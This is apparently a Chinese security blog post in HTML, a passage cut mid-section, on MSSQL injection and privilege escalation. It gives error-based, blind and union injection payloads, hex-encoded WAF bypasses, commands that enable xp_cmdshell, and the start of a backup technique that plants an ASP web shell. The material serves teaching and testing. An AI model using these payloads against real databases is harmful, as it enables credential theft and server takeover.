@@ -1,0 +1,1357 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='go!'><title>MSSQL 注入与提权相关</title>
+
+<link rel='canonical' href='https://coollllllll.github.io/p/mssql/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='MSSQL 注入与提权相关'>
+<meta property='og:description' content='go!'>
+<meta property='og:url' content='https://coollllllll.github.io/p/mssql/'>
+<meta property='og:site_name' content='cOOl &#39;s blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2020-10-09T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2020-10-09T00:00:00&#43;00:00'/><meta property='og:image' content='https://coollllllll.github.io/p/mssql/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+<meta name="twitter:title" content="MSSQL 注入与提权相关">
+<meta name="twitter:description" content="go!"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://coollllllll.github.io/p/mssql/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>返回</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/mssql/">
+                <img src="/p/mssql/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg"
+                        srcset="/p/mssql/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg 800w, /p/mssql/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="534" 
+                        loading="lazy"
+                        alt="Featured image of post MSSQL 注入与提权相关" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%B8%B8%E7%94%A8/" style="background-color: #2a9d8f; color: #fff;">
+                常用
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/mssql/">MSSQL 注入与提权相关</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        go!
+    </h3>
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Oct 09, 2020</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 10 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <h1 id="mssql注入与提权相关">MSSQL注入与提权相关</h1>
+<h2 id="sql-server简介">SQL Server简介</h2>
+<h3 id="系统数据库">系统数据库</h3>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 144; 
+			flex-basis: 347px"
+	>
+	<a href="/p/mssql/image-20220217170606658.png" data-size="168x116">
+		<img src="/p/mssql/image-20220217170606658.png"
+			width="168"
+			height="116"
+			srcset="/p/mssql/image-20220217170606658_hu19848205de2b9d0c52ec1b04b45775d4_3655_480x0_resize_box_3.png 480w, /p/mssql/image-20220217170606658_hu19848205de2b9d0c52ec1b04b45775d4_3655_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<ul>
+<li>
+<p>master：用于记录所有 SQL Server 系统级别的信息，这些信息用于控制用户数据库和数据操作。</p>
+</li>
+<li>
+<p>model：SQL Server 为用户数据库提供的样板，新的用户数据库都以 model 数据库为基础</p>
+</li>
+<li>
+<p>msdb：由 Enterprise Manager 和 Agent 使用，记录着任务计划信息、事件处理信息、数据备份及恢复信息、警告及异常信息。</p>
+</li>
+<li>
+<p>tempdb：它为临时表和其他临时工作提供了一个存储区。</p>
+</li>
+</ul>
+<blockquote>
+<p>master数据库存储了所有数据库名和存储过程，类似MySQL中的<code>information_schema</code> 元数据库。</p>
+</blockquote>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 70; 
+			flex-basis: 168px"
+	>
+	<a href="/p/mssql/image-20220217171743009.png" data-size="298x425">
+		<img src="/p/mssql/image-20220217171743009.png"
+			width="298"
+			height="425"
+			srcset="/p/mssql/image-20220217171743009_hu9bcb8cb4075ab006942e5046680901ad_15908_480x0_resize_box_3.png 480w, /p/mssql/image-20220217171743009_hu9bcb8cb4075ab006942e5046680901ad_15908_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>视图表<code>master.dbo.sysdatabases</code>存储所有数据库名，其他数据库则存储本库的表名和列名；每一个库的视图表<code>syscolumns</code>存储所有的字段；可编程性存储函数。</p>
+<p><strong>查询所有数据库名：</strong></p>
+<pre tabindex="0"><code>select name from master.dbo.sysdatabases;
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 121; 
+			flex-basis: 290px"
+	>
+	<a href="/p/mssql/image-20220217171832158.png" data-size="144x119">
+		<img src="/p/mssql/image-20220217171832158.png"
+			width="144"
+			height="119"
+			srcset="/p/mssql/image-20220217171832158_hu92cfdaa8fe6337f53e9d7fffbbc3c54c_2623_480x0_resize_box_3.png 480w, /p/mssql/image-20220217171832158_hu92cfdaa8fe6337f53e9d7fffbbc3c54c_2623_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h3 id="sysobjects表字段">sysobjects表字段</h3>
+<p>在数据库中创建的每个对象（例如约束、默认值、日志、规则以及存储过程）都对应一行。</p>
+<pre tabindex="0"><code>select name,xtype from sysobjects;
+</code></pre><p>查询返回结果中，<code>xtype</code>可以是如下：</p>
+<ul>
+<li>C = CHECK 约束</li>
+<li>D = 默认值或 DEFAULT 约束</li>
+<li>F = FOREIGN KEY 约束</li>
+<li>L = 日志</li>
+<li>FN = 标量函数</li>
+<li>IF = 内嵌表函数</li>
+<li>P = 存储过程</li>
+<li>PK = PRIMARY KEY 约束（类型是 K）</li>
+<li>RF = 复制筛选存储过程</li>
+<li>S = 系统表</li>
+<li>TF = 表函数</li>
+<li>TR = 触发器</li>
+<li>U = 用户表</li>
+<li>UQ = UNIQUE 约束（类型是 K）</li>
+<li>V = 视图</li>
+<li>X = 扩展存储过程</li>
+</ul>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 135; 
+			flex-basis: 324px"
+	>
+	<a href="/p/mssql/image-20220217172311966.png" data-size="203x150">
+		<img src="/p/mssql/image-20220217172311966.png"
+			width="203"
+			height="150"
+			srcset="/p/mssql/image-20220217172311966_hu57f2ae1f5213b16bb4f35681308dba30_3054_480x0_resize_box_3.png 480w, /p/mssql/image-20220217172311966_hu57f2ae1f5213b16bb4f35681308dba30_3054_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h2 id="sql-server-信息收集">SQL Server 信息收集</h2>
+<h3 id="权限判断">权限判断</h3>
+<p>SQL Server有三大主体：</p>
+<ul>
+<li>Windows 级别主体</li>
+<li>服务器级别主体</li>
+<li>数据库级别主体</li>
+</ul>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 202; 
+			flex-basis: 484px"
+	>
+	<a href="/p/mssql/image-20220217173609163.png" data-size="584x289">
+		<img src="/p/mssql/image-20220217173609163.png"
+			width="584"
+			height="289"
+			srcset="/p/mssql/image-20220217173609163_hubb5ac6d377cd8816c6447a5b5c9cc4b6_54436_480x0_resize_box_3.png 480w, /p/mssql/image-20220217173609163_hubb5ac6d377cd8816c6447a5b5c9cc4b6_54436_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h4 id="服务器级别角色">服务器级别角色</h4>
+<p>SQL Server 提供服务器级角色以帮助你管理服务器上的权限。 这些角色是可组合其他主体的安全主体。 服务器级角色的权限作用域为服务器范围。 （“角色”类似于 Windows 操作系统中的“组”。）</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 114; 
+			flex-basis: 275px"
+	>
+	<a href="/p/mssql/image-20220217173800119.png" data-size="857x746">
+		<img src="/p/mssql/image-20220217173800119.png"
+			width="857"
+			height="746"
+			srcset="/p/mssql/image-20220217173800119_hu5ae8a1a27425497e517cc8f02b7b92a1_100089_480x0_resize_box_3.png 480w, /p/mssql/image-20220217173800119_hu5ae8a1a27425497e517cc8f02b7b92a1_100089_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>可使用<code>IS_SRVROLEMEMBER ( 'role' [ , 'login' ] )</code> 来判断登录名是否为指定服务器角色的成员，该函数有如下返回值：</p>
+<table>
+<thead>
+<tr>
+<th>返回值</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>login 不是 role 的成员。</td>
+</tr>
+<tr>
+<td>1</td>
+<td>login 是 role 的成员。</td>
+</tr>
+<tr>
+<td>NULL</td>
+<td>role 或 login 无效，或者没有查看角色成员身份的权限。</td>
+</tr>
+</tbody>
+</table>
+<p><strong>因此可通过如下语句判断登录名的服务器角色：</strong></p>
+<pre tabindex="0"><code>and 1=(select is_srvrolemember('sysadmin'))
+and 1=(select is_srvrolemember('serveradmin'))
+and 1=(select is_srvrolemember('setupadmin'))
+and 1=(select is_srvrolemember('securityadmin'))
+and 1=(select is_srvrolemember('diskadmin'))
+and 1=(select is_srvrolemember('bulkadmin'))
+</code></pre><blockquote>
+<p><strong>使用sqlmap的<code>-is-dba</code>可判断是否为管理员权限。</strong></p>
+</blockquote>
+<h4 id="数据库级别角色">数据库级别角色</h4>
+<p>数据库级角色的权限作用域为数据库范围。</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 155; 
+			flex-basis: 373px"
+	>
+	<a href="/p/mssql/image-20220217175907982.png" data-size="879x565">
+		<img src="/p/mssql/image-20220217175907982.png"
+			width="879"
+			height="565"
+			srcset="/p/mssql/image-20220217175907982_hu641505fdcd6bbe60067b6cc285d41374_73042_480x0_resize_box_3.png 480w, /p/mssql/image-20220217175907982_hu641505fdcd6bbe60067b6cc285d41374_73042_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>可使用<code>select IS_MEMBER('db_owner')</code>判断当前用户是否为指定 Microsoft Windows 组或 SQL Server 数据库角色的成员。</p>
+<pre tabindex="0"><code>and 1=(select is_member('db_owner'))
+</code></pre><h3 id="基本信息获取">基本信息获取</h3>
+<pre tabindex="0"><code># 数据库版本
+select @@version
+
+# 获取当前登录用户名
+select user
+
+# 获取当前数据库名
+select db_name()
+
+# 遍历其他数据库
+select db_name(n)
+
+# 是否支持多语句查询
+;select user
+</code></pre><h3 id="站库分离判断">站库分离判断</h3>
+<ul>
+<li>判断数据库服务器名和Web应用服务器名是否相等。</li>
+</ul>
+<pre tabindex="0"><code>select * from info where id='1' and host_name()=@@servername;--'
+</code></pre><ul>
+<li>也可调用xp_cmdshell通过cmd命令判断</li>
+</ul>
+<h2 id="sql-server-基本语法">SQL Server 基本语法</h2>
+<h3 id="注释与空白符">注释与空白符</h3>
+<ul>
+<li>注释</li>
+</ul>
+<pre tabindex="0"><code>/**/
+--
+;%00
+</code></pre><ul>
+<li>空白符</li>
+</ul>
+<pre tabindex="0"><code>01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20
+select CHAR(01)
+
+/**/
+</code></pre><h3 id="运算符">运算符</h3>
+<pre tabindex="0"><code>+   加法运算
+-   减法运算
+*   乘法运算
+/   除法运算，如果两个表达式值都是整数，那么结果只取整数值，小数值将略去
+%   取模运算，返回两数相除后的余数
+
+&amp;   位与逻辑运算，从两个表达式中取对应的位。当且仅当输入表达式中两个位的值都为 1 时，结果中的位才被设置为 1，否则，结果中的位被设置为 0
+|   位或逻辑运算，从两个表达式中取对应的位。如果输入表达式中两个位只要有一个的值为 1 时，结果的位就被设置为 1，只有当两个位的值都为 0 时，结果中的位才被设置为 0
+^   位异或运算，从两个表达式中取对应的位。如果输入表达式中两个位只有一个的值为 1 时，结果中的位就被设置为 1；只有当两个位的值都为 0 或 1 时，结果中的位才被设置为0
+
+=   等于 
+&lt;&gt;  不等于
+&gt;   大于  
+!=  不等于
+&lt;   小于  
+!&lt;  不小于
+&gt;=  大于或等于   
+!&gt;  不大于
+&lt;=  小于或等于
+
+ALL 如果一组的比较都为 true，则比较结果为 true
+AND 如果两个布尔表达式都为 true，则结果为 true；如果其中一个表达式为 false，则结果为 false
+ANY 如果一组的比较中任何一个为 true，则结果为 true
+BETWEEN 如果操作数在某个范围之内，那么结果为 true
+EXISTS  如果子查询中包含了一些行，那么结果为 true
+IN  如果操作数等于表达式列表中的一个，那么结果为 true
+LIKE    如果操作数与某种模式相匹配，那么结果为 true
+NOT 对任何其他布尔运算符的结果值取反
+OR  如果两个布尔表达式中的任何一个为 true，那么结果为 true
+SOME    如果在一组比较中，有些比较为 true，那么结果为 true
+</code></pre><h2 id="mssql-注入">MSSQL 注入</h2>
+<h3 id="显错注入">显错注入</h3>
+<h4 id="原理">原理</h4>
+<p>MSSQL中的报错主要靠的是数据类型转换时会进行报错回显。其中类型转换味蕾两类：隐式转换和显示转换。</p>
+<ul>
+<li>隐式转换</li>
+</ul>
+<pre tabindex="0"><code>select * from admin where id =1 and (select user)&gt;0--
+
+select * from admin where id =1|(select user)--
+
+在将 varchar类型的 'dbo' 数据转换成 int 时失败，从而报错回显。
+</code></pre><ul>
+<li>显示转换</li>
+</ul>
+<p>一般利用函数进行转换从而报错，例如<code>cast</code>和<code>convert</code>函数。</p>
+<pre tabindex="0"><code>select * from admin where id =1 (select CAST(USER as int))
+
+select * from admin where id =1 (select convert(int,user))
+</code></pre><h4 id="利用">利用</h4>
+<ul>
+<li>获取当前数据库</li>
+</ul>
+<pre tabindex="0"><code>select * from fsb_users where user_id = 1 and db_name()&gt;0;--
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 394; 
+			flex-basis: 945px"
+	>
+	<a href="/p/mssql/image-20220218100902668.png" data-size="788x200">
+		<img src="/p/mssql/image-20220218100902668.png"
+			width="788"
+			height="200"
+			srcset="/p/mssql/image-20220218100902668_hu8c3a9dea13378a4d05dbc4f61b30732f_30876_480x0_resize_box_3.png 480w, /p/mssql/image-20220218100902668_hu8c3a9dea13378a4d05dbc4f61b30732f_30876_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<ul>
+<li>获取表</li>
+</ul>
+<pre tabindex="0"><code>select * from fsb_users where user_id = 1 and 1=(select top 1 name from sysobjects where xtype='u');--
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 437; 
+			flex-basis: 1048px"
+	>
+	<a href="/p/mssql/image-20220218101336531.png" data-size="743x170">
+		<img src="/p/mssql/image-20220218101336531.png"
+			width="743"
+			height="170"
+			srcset="/p/mssql/image-20220218101336531_hub1f92da688b610d7571ba909f94f5b79_29368_480x0_resize_box_3.png 480w, /p/mssql/image-20220218101336531_hub1f92da688b610d7571ba909f94f5b79_29368_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>在得到一个表后，想要暴其他表时，加入判断条件即可：</p>
+<pre tabindex="0"><code>select * from fsb_users where user_id = 1 and 1=(select top 1 name from sysobjects where xtype='u' and name not in ('fsb_messages'));--
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 387; 
+			flex-basis: 930px"
+	>
+	<a href="/p/mssql/image-20220218101636136.png" data-size="737x190">
+		<img src="/p/mssql/image-20220218101636136.png"
+			width="737"
+			height="190"
+			srcset="/p/mssql/image-20220218101636136_hufdbc9e7cc167407d86d549f3f7763156_30092_480x0_resize_box_3.png 480w, /p/mssql/image-20220218101636136_hufdbc9e7cc167407d86d549f3f7763156_30092_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<ul>
+<li>获取字段</li>
+</ul>
+<pre tabindex="0"><code>select * from fsb_users where user_id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = 'fsb_users') and name not in ('user_id'));--
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 461; 
+			flex-basis: 1108px"
+	>
+	<a href="/p/mssql/image-20220218102432157.png" data-size="753x163">
+		<img src="/p/mssql/image-20220218102432157.png"
+			width="753"
+			height="163"
+			srcset="/p/mssql/image-20220218102432157_hubfc8a3b7b460b91f64c6d575143fe716_27882_480x0_resize_box_3.png 480w, /p/mssql/image-20220218102432157_hubfc8a3b7b460b91f64c6d575143fe716_27882_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<ul>
+<li>获取数据</li>
+</ul>
+<pre tabindex="0"><code>select * from fsb_users where user_id=1 and 1=(select top 1 user_name+':'+password from fsb_users);--
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 233; 
+			flex-basis: 559px"
+	>
+	<a href="/p/mssql/image-20220218105845963.png" data-size="877x376">
+		<img src="/p/mssql/image-20220218105845963.png"
+			width="877"
+			height="376"
+			srcset="/p/mssql/image-20220218105845963_hu4a4e938b3afbdd0cac9a9a0d2eee07d3_9693_480x0_resize_box_3.png 480w, /p/mssql/image-20220218105845963_hu4a4e938b3afbdd0cac9a9a0d2eee07d3_9693_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<ul>
+<li>其他用法</li>
+</ul>
+<pre tabindex="0"><code># 获取表名
+id=1 and 1=(select top 1 table_name from information_schema.tables);--
+</code></pre><pre tabindex="0"><code># 获取当前表明和列名
+user_id=1 having 1=1
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 500; 
+			flex-basis: 1200px"
+	>
+	<a href="/p/mssql/image-20220218105426397.png" data-size="840x168">
+		<img src="/p/mssql/image-20220218105426397.png"
+			width="840"
+			height="168"
+			srcset="/p/mssql/image-20220218105426397_hu576a3bcc38a3264774cb8e2205820ee5_35836_480x0_resize_box_3.png 480w, /p/mssql/image-20220218105426397_hu576a3bcc38a3264774cb8e2205820ee5_35836_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<pre tabindex="0"><code># 暴出其他字段
+user_id=1 group by fsb_users.user_id,fsb_users.user_name having 1=1
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 516; 
+			flex-basis: 1240px"
+	>
+	<a href="/p/mssql/image-20220218105637916.png" data-size="837x162">
+		<img src="/p/mssql/image-20220218105637916.png"
+			width="837"
+			height="162"
+			srcset="/p/mssql/image-20220218105637916_hu6f263da4b17ffa7926ddf1293faed63c_35868_480x0_resize_box_3.png 480w, /p/mssql/image-20220218105637916_hu6f263da4b17ffa7926ddf1293faed63c_35868_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h4 id="简单绕过">简单绕过</h4>
+<p><code>declare</code>函数时MSSQL中声明局部变量的函数，可用他绕过WAF对关键字的拦截：</p>
+<pre tabindex="0"><code>select * from fsb_users where user_id=1;declare @a nvarchar(2000) set @a='select convert(int,@@version)' exec(@a) --
+
+declare定义变量，set设置变量值，exec执行变量
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 428; 
+			flex-basis: 1029px"
+	>
+	<a href="/p/mssql/image-20220218112010739.png" data-size="596x139">
+		<img src="/p/mssql/image-20220218112010739.png"
+			width="596"
+			height="139"
+			srcset="/p/mssql/image-20220218112010739_hu2003ff61ce84f4b82b63baa545447983_7918_480x0_resize_box_3.png 480w, /p/mssql/image-20220218112010739_hu2003ff61ce84f4b82b63baa545447983_7918_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>其中变量值支持HEX和ascii码，在过滤引号情况下可以编码绕过：</p>
+<pre tabindex="0"><code>select * from fsb_users where user_id=1;declare @s varchar(2000) set @s=0x73656c65637420636f6e7665727428696e742c404076657273696f6e29 exec(@s)--
+
+select * from fsb_users where user_id=1;declare @s varchar(2000) set @s= CHAR(115) + CHAR(101) + CHAR(108) + CHAR(101) + CHAR(99) + CHAR(116) + CHAR(32) + CHAR(99) + CHAR(111) + CHAR(110) + CHAR(118) + CHAR(101) + CHAR(114) + CHAR(116) + CHAR(40) + CHAR(105) + CHAR(110) + CHAR(116) + CHAR(44) + CHAR(64) + CHAR(64) + CHAR(118) + CHAR(101) + CHAR(114) + CHAR(115) + CHAR(105) + CHAR(111) + CHAR(110) + CHAR(41) exec(@s)--
+</code></pre><h3 id="盲注">盲注</h3>
+<p>和MySQL中利用思路类似：分割字符并比较。</p>
+<h4 id="bool盲注">bool盲注</h4>
+<pre tabindex="0"><code># 暴数据库
+id=1 and ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)) &gt;= 97
+
+# 暴数据：test数据库中users表中password列中第一行数据的第一个字符的ascii值
+and unicode(substring((select isnull(cast(password as nvarchar(4000)),char(32)) from(select password, row_number() over (order by (select 1)) as limit from test.dbo.users)x where limit=1),1,1))&gt;N
+</code></pre><h4 id="时间型盲注">时间型盲注</h4>
+<pre tabindex="0"><code>id=1;if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:5'--
+
+id=1;if (ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)))&gt;1 WAITFOR DELAY '0:0:5'--
+</code></pre><h3 id="联合注入">联合注入</h3>
+<p>MSSQL中的联合查询使用null占位，不使用数字占位是因为可能发生隐式转换。</p>
+<h4 id="利用-1">利用</h4>
+<pre tabindex="0"><code># 查列数
+user_id=1 order by 5
+</code></pre><pre tabindex="0"><code># 查数据
+user_id=1 union select null,user_name,password,null,null from fsb_users
+
+# 结合报错的union
+1 ;SELECT 1 UNION (select CAST(USER as int))
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 373; 
+			flex-basis: 897px"
+	>
+	<a href="/p/mssql/image-20220218153256017.png" data-size="460x123">
+		<img src="/p/mssql/image-20220218153256017.png"
+			width="460"
+			height="123"
+			srcset="/p/mssql/image-20220218153256017_hu5e0dea90a1f543d0e15ffcf6d4af7e53_7481_480x0_resize_box_3.png 480w, /p/mssql/image-20220218153256017_hu5e0dea90a1f543d0e15ffcf6d4af7e53_7481_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20220218153256017">
+	</a>
+	
+	<figcaption>image-20220218153256017</figcaption>
+	
+</figure></p>
+<h2 id="mssql-提权">MSSQL 提权</h2>
+<p>首先判断权限:</p>
+<ul>
+<li>
+<p>DB_OWNER权限：备份拿shell</p>
+</li>
+<li>
+<p>SA权限：<code>xp_cmdshell</code>和<code>sp_oacreate</code>提权</p>
+</li>
+</ul>
+<h3 id="备份拿shell">备份拿shell</h3>
+<p><strong>备份拿shel的原理就是在备份过程中写入一句话木马。</strong></p>
+<p>MSSQL中常见的备份策略：</p>
+<ul>
+<li>每周一次完整备份</li>
+<li>每天一次差异备份</li>
+<li>每小时一次事务日志备份</li>
+</ul>
+<p>利用备份拿shell需要知道网站根路径信息，且需要网站目录的写权限等。</p>
+<h4 id="寻找路径">寻找路径</h4>
+<p>一般有以下几个思路：</p>
+<ul>
+<li>报错信息中找</li>
+<li>字典暴破</li>
+<li>旁站信息收集</li>
+<li>调用存储过程搜索</li>
+<li>读取配置文件之类</li>
+</ul>
+<p>一般可用<code>xp_cmdshell</code>、<code>xp_dirtree</code>、<code>xp_subdirs</code>来搜索目录信息。</p>
+<ul>
+<li>xp_dirtree</li>
+</ul>
+<pre tabindex="0"><code>execute master..xp_dirtree 'c:'       //列出所有 c:\ 文件和目录,子目录 
+execute master..xp_dirtree 'c:',1     //只列 c:\ 文件夹 
+execute master..xp_dirtree 'c:',1,1   //列 c:\ 文件夹加文件 
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 114; 
+			flex-basis: 274px"
+	>
+	<a href="/p/mssql/image-20220218165323227.png" data-size="645x563">
+		<img src="/p/mssql/image-20220218165323227.png"
+			width="645"
+			height="563"
+			srcset="/p/mssql/image-20220218165323227_hu440abae7cf456f50b5670e562d4b2f8f_16500_480x0_resize_box_3.png 480w, /p/mssql/image-20220218165323227_hu440abae7cf456f50b5670e562d4b2f8f_16500_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>当执行<code>xp_dirtree</code>没有回显时，可创建临时表，并将执行结果插入到表中：</p>
+<pre tabindex="0"><code>id=1;CREATE TABLE temp (dir varchar(8000),num1 int,num2 int);
+
+id=1;insert into temp(dir,num1,num2) execute master..xp_dirtree 'c:',1,1
+</code></pre><ul>
+<li>xp_cmdshell</li>
+</ul>
+<p>使用cmd命令搜索<code>test.aspx</code>：</p>
+<pre tabindex="0"><code>for /r c:\ %i in (test.aspx) do @echo %i
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 1391; 
+			flex-basis: 3340px"
+	>
+	<a href="/p/mssql/image-20220218171017248.png" data-size="501x36">
+		<img src="/p/mssql/image-20220218171017248.png"
+			width="501"
+			height="36"
+			srcset="/p/mssql/image-20220218171017248_hud0f42db194de039722475e6c9c9607dc_1542_480x0_resize_box_3.png 480w, /p/mssql/image-20220218171017248_hud0f42db194de039722475e6c9c9607dc_1542_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>不回显情况：</p>
+<pre tabindex="0"><code>id=1;CREATE TABLE temp (dir varchar(8000));
+
+id=1;insert into temp(dir) exec master..xp_cmdshell 'for /r c:\ %i in (test.aspx) do @echo %i'
+</code></pre><blockquote>
+<p>当xp_cmdshell不能调用或报错，一般是SQL Server 阻止了对组件 <code>xp_cmdshell</code> 的过程 <code>sys.xp_cmdshell</code> 的访问。</p>
+<p><strong>系统管理员</strong>可以通过使用 sp_configure 启用<code>xp_cmdshell</code> ：</p>
+<pre tabindex="0"><code># 允许修改高级参数 
+;EXEC sp_configure 'show advanced options',1;RECONFIGURE;
+
+# 打开xp_cmdshell 扩展
+;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
+</code></pre><p>关闭<code>xp_cmdshell</code> ：</p>
+<pre tabindex="0"><code># 允许修改高级参数 
+;EXEC sp_configure 'show advanced options',1;RECONFIGURE;
+
+# 打开xp_cmdshell 扩展
+;EXEC sp_configure 'xp_cmdshell',0;RECONFIGURE;
+
+;EXEC sp_configure 'show advanced options',0;RECONFIGURE;
+</code></pre></blockquote>
+<h4 id="log备份">Log备份</h4>
+<p>利用Log备份的条件：</p>
+<ul>
+<li>已有一次完整的备份文件，即某数据库下得有一个该库的备份文件，且<strong>恢复模式必须是完整模式</strong></li>
+<li>知晓网站根路径<strong>且可写</strong></li>
+<li>支持堆叠注入</li>
+</ul>
+<pre tabindex="0"><code># 设置恢复模式是完整模式
+alter database 库名 set RECOVERY FULL 
+
+create table cmd (a image) 
+
+# 先进行一次完整备份，这样就有备份文件
+backup log 库名 to disk = 'c:\xxx' with init 
+
+# 插入asp一句话木马`&lt;%execute(request(&quot;a&quot;))%&gt;`
